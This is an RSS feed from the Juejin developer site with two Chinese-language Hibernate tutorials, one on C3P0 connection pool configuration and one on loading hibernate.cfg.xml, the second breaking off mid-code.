<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Hibernate（45）什么是Hibernate的连接池优化？]]></title>    <link>https://juejin.cn/post/7595801647247310867</link>    <guid>https://juejin.cn/post/7595801647247310867</guid>    <pubDate>2026-01-16T11:54:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595801647247310867" data-draft-id="7595769731199090694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（45）什么是Hibernate的连接池优化？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-16T11:54:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（45）什么是Hibernate的连接池优化？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T11:54:07.000Z" title="Fri Jan 16 2026 11:54:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，连接池（Connection Pool）是管理数据库连接的一种机制，旨在优化数据库连接的性能。当应用程序需要访问数据库时，它不必每次都创建和销毁连接，而是从连接池中获取已创建的连接，这样可以显著提高性能。</p>
<h3 data-id="heading-0">连接池的优化</h3>
<p>Hibernate支持多种连接池实现，包括Hibernate内置的连接池和第三方连接池（如C3P0、HikariCP、DBCP等）。第三方连接池通常比Hibernate内置连接池提供更好的性能和更多的配置选项，因此更适合生产环境。</p>
<p>下面展示如何配置和优化Hibernate连接池，以C3P0为例。</p>
<h4 data-id="heading-1">步骤一：引入C3P0依赖</h4>
<p>首先，需要在项目中引入C3P0的依赖。如果使用Maven，可以在<code>pom.xml</code>中添加以下依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">步骤二：配置Hibernate连接池</h4>
<p>在<code>hibernate.cfg.xml</code>配置文件中配置C3P0连接池的相关属性：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- C3P0 连接池配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.min_size"</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.timeout"</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_statements"</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.idle_test_period"</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.acquire_increment"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">连接池属性解释</h4>
<ul>
<li><code>hibernate.c3p0.min_size</code>：连接池中保持的最小连接数。</li>
<li><code>hibernate.c3p0.max_size</code>：连接池中允许的最大连接数。</li>
<li><code>hibernate.c3p0.timeout</code>：连接在被丢弃之前可以闲置的最长时间（秒）。</li>
<li><code>hibernate.c3p0.max_statements</code>：连接池所提供的JDBC预处理语句缓存的大小。</li>
<li><code>hibernate.c3p0.idle_test_period</code>：每隔多少秒检查所有连接池中的空闲连接。</li>
<li><code>hibernate.c3p0.acquire_increment</code>：当连接池中的连接耗尽时，一次性创建的连接数。</li>
</ul>
<h4 data-id="heading-4">步骤三：实用类HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-5">步骤四：测试连接池优化</h4>
<p>编写一个简单的测试类来验证连接池的配置和性能。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateConnectionPoolTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 测试连接池</span>
        testConnectionPool(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnectionPool</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) {
            <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
            <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 执行查询或其他数据库操作</span>
                System.out.println(<span class="hljs-string">"Session "</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">" is opened"</span>);

                <span class="hljs-comment">// 提交事务</span>
                transaction.commit();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                    transaction.rollback();
                }
                e.printStackTrace();
            } <span class="hljs-keyword">finally</span> {
                session.close();
                System.out.println(<span class="hljs-string">"Session "</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">" is closed"</span>);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-6">详细解释</h3>
<ol>
<li>
<p><strong>引入C3P0依赖</strong>：</p>
<ul>
<li>在项目的<code>pom.xml</code>文件中添加C3P0的依赖，以便在项目中使用C3P0连接池。</li>
</ul>
</li>
<li>
<p><strong>配置Hibernate连接池</strong>：</p>
<ul>
<li>在<code>hibernate.cfg.xml</code>中添加C3P0连接池的配置属性，包括最小连接数、最大连接数、超时时间、最大语句数、空闲测试周期和获取增量等参数。</li>
<li>这些配置参数可以根据应用程序的需求进行调整，以优化数据库连接池的性能。</li>
</ul>
</li>
<li>
<p><strong>实用类HibernateUtil</strong>：</p>
<ul>
<li><code>HibernateUtil</code>类提供了一个静态方法来获取<code>SessionFactory</code>实例，并在静态块中初始化<code>SessionFactory</code>。</li>
</ul>
</li>
<li>
<p><strong>测试连接池优化</strong>：</p>
<ul>
<li><code>HibernateConnectionPoolTest</code>类通过循环打开和关闭多个<code>Session</code>来测试连接池的配置和性能。</li>
<li>打印每个<code>Session</code>的打开和关闭操作，验证C3P0连接池是否正常工作。</li>
</ul>
</li>
</ol>
<p>通过这种方式，可以有效地配置和优化Hibernate的连接池，从而提高应用程序的性能和响应速度。使用连接池可以减少创建和销毁数据库连接的开销，提高数据库访问的效率。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（46） Hibernate的配置文件如何加载？]]></title>    <link>https://juejin.cn/post/7595801647247327251</link>    <guid>https://juejin.cn/post/7595801647247327251</guid>    <pubDate>2026-01-16T11:55:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595801647247327251" data-draft-id="7595552420048338987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（46） Hibernate的配置文件如何加载？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-16T11:55:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（46） Hibernate的配置文件如何加载？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T11:55:28.000Z" title="Fri Jan 16 2026 11:55:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，配置文件通常用于定义数据库连接信息、Hibernate属性和实体类映射等。常见的配置文件包括<code>hibernate.cfg.xml</code>和<code>hibernate.properties</code>。本文将详细介绍如何加载Hibernate的配置文件，并结合代码示例说明。</p>
<h3 data-id="heading-0">加载Hibernate配置文件</h3>
<h4 data-id="heading-1">1. 使用<code>hibernate.cfg.xml</code>加载配置</h4>
<p><code>hibernate.cfg.xml</code>是最常用的Hibernate配置文件。通常放置在类路径的根目录下。</p>
<h5 data-id="heading-2">示例配置文件 <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h5 data-id="heading-3">加载<code>hibernate.cfg.xml</code>的示例代码</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

